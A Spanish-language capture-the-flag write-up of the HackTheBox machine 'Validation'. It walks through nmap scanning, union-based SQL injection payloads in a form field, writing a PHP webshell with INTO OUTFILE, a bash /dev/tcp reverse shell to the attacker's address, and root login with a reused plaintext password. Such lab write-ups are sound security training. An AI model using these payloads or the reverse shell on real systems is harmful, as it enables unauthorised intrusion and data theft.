---
title: "Validation"
date: 2025-05-29 16:41:50 +0200
categories: writeups HackTheBox
tags: inyecciónsql infoleak rce autopwned máquina
description: Writeup de la máquina Validation de Hackthebox.
image: ../assets/images/posts/logos/hackthebox.png
---
- AutoPwned: **validation\_autopwned.py**
___
## Reconocimiento

En primer lugar, debemos desplegar la máquina para poder obtener la **Dirección IP** todo ello desde la web de **HackTheBox** y luego desde la **terminal** debemos conectarnos a la VPN usando el fichero correspondiente de la siguiente forma:

```bash
openvpn lab_trr0r.opvn
```

Después le lanzaremos un **ping** para ver si se encuentra activa dicha máquina, además de ver si acepta la traza **ICM**. Comprobamos que efectivamente nos devuelve el paquete que le enviamos por lo que acepta la traza **ICMP**, gracias al **ttl** podremos saber si se trata de una máquina **Linux (TTL 64 )** y **Windows (TTL 128)**, y vemos que se trata de una máquina **Linux** pues cuenta con **TTL** próximo a 64 (**63**), además gracias al script ****whichSystem.py**** podremos conocer dicha información.

![](<../assets/images/posts/2025-05-29-validation/Pasted image 20241225114118.png>)

> El motivo por el cual el **TTL** es de **63** es porque el paquete pasa por unos intermediarios (routers) antes de llegar a su destino (máquina atacante). Esto podemos comprobarlo con el comando `ping -c 1 -R 10.10.11.116`.
### Nmap

En segundo lugar, realizaremos un escaneo usando **Nmap** para ver que puertos de la máquina víctima se encuentra abiertos.

```bash
nmap -p- --open --min-rate 5000 -sS -v -Pn -n 10.10.11.116 -oG allPorts
```

Observamos como nos reporta que se encuentran abiertos los puertos **22, 80, 4566 y 8080**.

![](<../assets/images/posts/2025-05-29-validation/Pasted image 20241225114332.png>)

Ahora, gracias a la utilidad **getPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.

A continuación, volveremos a realizar un escaneo con **Nmap**, pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto.

```bash
nmap -p22,80,4566,8080 -sCV 10.10.11.116 -oN targeted
```

Lo que podemos sacar en claro de este escaneo más detallado es que existen tres puertos que alojan un servidor web y dos de ellos están inaccesibles pues cuentan con un **403 - Forbidden** y con un **502 - Bad Gateway** por lo que solo nos queda el servidor web que corre por el puerto **80** y el servicio de **ssh** por el puerto **22**.

![](<../assets/images/posts/2025-05-29-validation/Pasted image 20241225114414.png>)

____
## Explotación

### Puerto 4566

Observamos como efectivamente tal y como nos había reportado **Nmap** la página web alojada en el puerto **4566** se encuentra inaccesible debido a un código de error **403 - Forbidden**.

![](<../assets/images/posts/2025-05-29-validation/Pasted image 20241225124324.png>)
### Puerto 8080

Al igual que **Nmap** nos había reportado, la página web alojada en el puerto **8080** también se encuentra inaccesible pero esta vez debido a un **502 - Bad Gateway**.

![](<../assets/images/posts/2025-05-29-validation/Pasted image 20241225124313.png>)
### Puerto 80

Al acceder al puerto **80** nos encontraremos con la siguiente página web en la cual tenemos un pequeño formulario donde hemos de introducir nuestro nombre y pais.

![](<../assets/images/posts/2025-05-29-validation/Pasted image 20241225114710.png>)

Cuando le damos a enviar veremos como nuestro nombre se ve reflejado en la página web por lo que podríamos intentar un **XSS**, **SSTI** o algún tipo de **Inyección**.

![](<../assets/images/posts/2025-05-29-validation/Pasted image 20241225114807.png>)

Observamos que no se acontece una **SSTI** pues al introducir `{{7 * 7}}` deberíamos ver `49` pero en cambio al introducir un `<h1>Hola</h1>` veremos como nos esta interpretando el código HTML por lo que es vulnerable a un **XSS** aunque ya os adelanto que la explotación no va por aquí pues si intentamos robar la cookie de algún usuario que este visitando la página no tendremos éxito.

![](<../assets/images/posts/2025-05-29-validation/Pasted image 20241225114948.png>)

Como parece que no se trata de un **XSS** probaremos una **SQL Injection** pues es la inyección más típica pero veremos que al introducir una comilla (`'`) no obtenemos ningún error por lo que podríamos pensar que no es vulnerable a una **SQL Injection**.

![](<../assets/images/posts/2025-05-29-validation/Pasted image 20241225115239.png>)

En este punto interceptaremos la petición gracias a ****BurpSuite**** y **FoxyProxy** para ver que datos se están enviando y así poder intentar una **SQL Injection** en otro campo. 

Enviaremos la petición al ****Repeater**** para trabajar más cómodamente y observaremos que además de nuestro nombre se está enviando el país por lo que probaremos una **SQL Injection** en dicho campo.

![](<../assets/images/posts/2025-05-29-validation/Pasted image 20241225115758.png>)

Para probar la **SQL Injection** pondremos una comilla simple (`'`) después de `Brazil` y al enviar la petición con <kbd>CTRL</kbd> + <kbd>Espacio</kbd> le daremos a `Follow redirection` y observaremos como en la respuesta no estamos viendo reflejada nuestra petición.

![](<../assets/images/posts/2025-05-29-validation/Pasted image 20241225120120.png>)

Este problema que estamos teniendo está relacionado con la máquina víctima pero desconozco el motivo para solucionarlo lo que debemos de hacer es copiarnos la **Cookie** que nos devuelve la respuesta **302 - Found**. En definitiva, lo que debemos de hacer es darle a enviar la petición (<kbd>CTRL</kbd> + <kbd>Espacio</kbd>) y como respuesta en primer lugar debemos ver un **302 - Found** por lo que nos copiaremos la **Cookie**.

![](<../assets/images/posts/2025-05-29-validation/Pasted image 20241225120401.png>)

Una vez copiada la **Cookie** realizaremos una nueva petición con dicha **Cookie** copiada y le daremos nuevamente a enviar petición (<kbd>CTRL</kbd> + <kbd>Espacio</kbd>), tras enviar la petición le daremos a `Follow Redirection` y veremos como ahora en la respuesta si que estamos viendo reflejada nuestra petición.

![](<../assets/images/posts/2025-05-29-validation/Pasted image 20241225120604.png>)

> Otra alternativa válida para solucionar esta problemática es capturar la petición con ****BurpSuite**** gracias al **FoxyProxy** y quedarnos en la pestaña **Proxy**/**Intercept** para modificar la petición desde ahí y observaremos como en el navegador veremos el error asociado a la vulnerabilidad **SQL Injection**.
> 
![](<../assets/images/posts/2025-05-29-validation/Pasted image 20241225120814.png>)
### SQL Injection

Lo primero que debemos saber es ante el tipo de **SQL Injection** que estamos.
#### Número de columnas

En primer lugar, debemos de saber el número de consultas que está usando la consulta **SQL** por detrás para ello enviaremos como cuerpo de la petición los siguientes datos para comprobar si la consulta **SQL** cuenta con **5** columnas.

```python
username=terror&country=Brazil' order by 5-- -
```

Observamos que la respuesta nos da un error por lo cual la petición no tiene **5** columnas.

![](<../assets/images/posts/2025-05-29-validation/Pasted image 20241225121449.png>)

Tras probar y probar nos daremos cuenta que la consulta **SQL** que se está ejecutando tan sólo está usando una única columna.

```python
username=terror&country=Brazil' order by 1-- -
```

![](<../assets/images/posts/2025-05-29-validation/Pasted image 20241225121742.png>)
#### Actual Base de Datos

Para comprobar si estamos ante una **Inyección SQL basada en uniones** probaremos la siguiente ****SQL Injection****.

```python
username=terror&country=Brazil' union select database()-- -
```

Observamos como nos devuelve el nombre de la base de datos en uso por lo que podemos sacar en claro que se trata de una **Inyección SQL basada en uniones**

![](<../assets/images/posts/2025-05-29-validation/Pasted image 20241225121950.png>)
#### Todas las Bases de Datos

En este punto lo que haremos será extraer los datos más significantes, para ello debemos de conocer todas las bases de datos lo cual lograremos gracias a la siguiente ****SQL Injection****:

```python
username=terror&country=Brazil' union select group_concat(schema_name) from information_schema.schemata-- -
```

Observamos que la base de datos más llamativa en la que tenemos en uso, es decir la **registration**.

![](<../assets/images/posts/2025-05-29-validation/Pasted image 20241225122425.png>)
#### Tablas de la base de datos registration

Para conocer las tablas de la base de datos **registration** deberemos realizar la siguiente **SQL Injection**:

```python
username=terror&country=Brazil' union select group_concat(table_name) from information_schema.tables where table_schema = 'registration'-- -
```

Observamos que la tabla de la base de datos **registration** se llama igual **registration** también.

![](<../assets/images/posts/2025-05-29-validation/Pasted image 20241225123033.png>)
#### Columnas de la tabla registration

En este punto lo que queremos conocer es las columnas de la tabla **registration** perteneciente a la base de datos **registration** para ello debemos de realizar la siguiente **SQL Injection**:

```python
username=terror&country=Brazil' union select group_concat(column_name) from information_schema.columns where table_schema = 'registration' and table_name = 'registration'-- -
```

Observamos que nos devuelve **4** columnas pero las que más nos saltan a la vista son la **username** y **userhash**.

![](<../assets/images/posts/2025-05-29-validation/Pasted image 20241225123442.png>)
#### Dumpear Información

Para extraer la información realizaremos la siguiente **SQL Injection** donde nos aprovechamos de `0x3a` que hace referencia al `:` para separar los datos y visualizarlos mejor.

```python
username=terror&country=Brazil' union select group_concat(username,0x3a,userhash) from registration-- -
```

Observaremos que la información que hemos extraído no es nada relevante pues son los datos que nosotros hemos introducido anteriormente.

![](<../assets/images/posts/2025-05-29-validation/Pasted image 20241225123930.png>)
### SQL Injection → RCE

En este punto como no hemos encontrado nada relevante en la base de datos y las otras página web se encuentra inaccesibles debemos plantearnos la opción de subir un fichero malicioso (**cmd.php**) a través de una **SQL Injection**.

En primer lugar lo que haremos será comprobar si podemos escribir en un fichero para ello ejecutaremos la siguiente **SQL Injection** donde estamos escribiendo la palabra **test** en el fichero **test.txt** en la ruta donde se suelen alojar los sitios web no seguros por defecto, es decir en **/var/www/html**.

```python
username=terror&country=Brazil' union select 'test' into outfile '/var/www/html/test.txt'-- -
```

Observamos que dicha **SQL Injection** nos da un error pero no debemos de hacerle mucho caso.

![](<../assets/images/posts/2025-05-29-validation/Pasted image 20241225125301.png>)

En cambio si nos dirigimos al navegador e intentamos acceder a nuestro fichero **test.txt** observamos que lo hemos podido crear satisfactoriamente y además contiene la palabra **test** introducida en una **SQL Injection**.

![](<../assets/images/posts/2025-05-29-validation/Pasted image 20241225125236.png>)

En este punto lo que haremos será crear un archivo malicioso el cual nos permita ejecutar comando remotamente (**RCE**) para ello usaremos el típico **cmd.php** pero como argumento pondremos el `0` para evitar conflicto con las comillas de la **SQL Injection**, es decir debemos de realizar la siguiente consulta:

```python
username=terror&country=Brazil' union select '<?php system($_GET[0]); ?>' into outfile '/var/www/html/cmd.php'-- -
```

En la respuesta volveremos a tener un mensaje de error pero si nos dirigimos al navegador e intentamos ejecutar comandos remotamente veremos como lo hemos logrado por lo que ahora lo que debemos de hacer es enviarnos una **Reverse Shell**.

![](<../assets/images/posts/2025-05-29-validation/Pasted image 20241225125901.png>)

En primer lugar para recibir la **Reverse Shell** debemos de ponernos en escucha con **NetCat** (`nc -nlvp 443`) y la consulta (comando) a ejecutar en nuestra webshell es el siguiente:

```http
http://10.10.11.116/cmd.php?0=bash -c "bash -i >%26 /dev/tcp/10.10.14.7/443 0>%261"
```
## Escalada de privilegios

Observamos como recibimos satisfactoriamente la **Reverse Shell** por lo cual lo que debemos de hacer ahora es un **Tratamiento de la TTY** para operar con una consola más cómoda.

![](<../assets/images/posts/2025-05-29-validation/Pasted image 20241225130244.png>)

Una vez realizado el **Tratamiento de la TTY** nos daremos cuenta que en **/var/www/html** hay un fichero un tanto inusual llamado **config.php**.

![](<../assets/images/posts/2025-05-29-validation/Pasted image 20241225130356.png>)

Al visualizar el contenido de dicho fichero podemos ver la una contraseña en texto plano.

![](<../assets/images/posts/2025-05-29-validation/Pasted image 20241225130508.png>)

Usaremos dicha contraseña para autenticarnos como el usuario **root** y sorprendentemente nos funcionará por lo que ya habríamos **pwneado** la máquina.

![](<../assets/images/posts/2025-05-29-validation/Pasted image 20241225130608.png>)